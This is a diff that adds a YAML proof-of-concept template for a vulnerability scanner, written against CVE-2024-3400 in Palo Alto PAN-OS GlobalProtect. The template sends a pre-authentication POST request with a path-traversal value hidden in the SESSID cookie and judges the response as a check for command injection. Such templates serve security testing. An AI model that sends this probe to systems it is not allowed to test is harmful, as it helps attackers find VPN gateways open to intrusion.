@@ -1,0 +1,19 @@
+name: poc-panos-cmdinject
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/ssl-vpn/hipreport.esp"
+      headers:
+        Cookie: "SESSID=/../../../opt/panlogs/tmp/device_telemetry/{{r0}}"
+      body: "test"
+    expression: response.status == 200 && (response.body.bcontains("GlobalProtect") || response.body.bcontains("SLICE_"))
+expression: r0()
+detail:
+  author: sxel
+  description: Palo Alto PAN-OS GlobalProtect command injection probe (CVE-2024-3400, pre-auth on affected versions)
+  severity: high
+  tags: paloalto,panos,vpn,cmdi
